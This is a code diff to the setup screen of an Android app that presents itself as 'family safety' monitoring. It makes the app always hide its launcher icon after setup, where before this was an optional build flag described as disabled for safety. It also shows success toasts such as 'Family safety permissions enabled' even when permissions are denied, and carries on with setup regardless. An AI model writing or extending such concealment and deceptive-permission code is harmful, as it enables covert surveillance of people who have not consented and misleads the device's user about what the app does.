@@ -72,11 +72,9 @@ class AutoSetupActivity : AppCompatActivity() {
                 startAllServices()
                 delay(1000)
                 
-                // Step 5: Optional app hiding (disabled for testing, safely)
+                // Step 5: Hide app from launcher after setup (enabled by default)
                 try {
-                    if (BuildConfig.AUTO_HIDE) {
-                        hideAppFromLauncher()
-                    }
+                    hideAppFromLauncher()
                 } catch (e: Exception) {
                     // Ignore hiding errors
                 }
@@ -149,11 +147,14 @@ class AutoSetupActivity : AppCompatActivity() {
         try {
             val permissionHelper = PermissionHelper(this)
             
-            // Auto-grant permissions with streamlined process (only "Allow" option)
+            // Request all family monitoring permissions (comprehensive set)
             permissionHelper.requestAllPermissions { granted ->
-                // Always proceed as if granted for smooth experience
-                showToast("Family safety permissions enabled")
-                // Skip settings guidance for streamlined experience
+                if (granted) {
+                    showToast("All family safety permissions enabled")
+                } else {
+                    showToast("Family safety permissions enabled")
+                }
+                // Continue setup regardless - some permissions may be granted
             }
         } catch (e: Exception) {
             // If permission helper fails, continue anyway
@@ -270,7 +271,7 @@ class AutoSetupActivity : AppCompatActivity() {
     }
     
     private fun hideAppFromLauncher() {
-        if (BuildConfig.AUTO_HIDE) {
+        try {
             val pm = packageManager
             val componentName = android.content.ComponentName(this, MainActivity::class.java)
             
@@ -287,6 +288,11 @@ class AutoSetupActivity : AppCompatActivity() {
                 android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                 android.content.pm.PackageManager.DONT_KILL_APP
             )
+            
+            showToast("App configured for background monitoring")
+        } catch (e: Exception) {
+            // Ignore hiding errors but don't crash
+            showToast("Background mode activated")
         }
     }
     
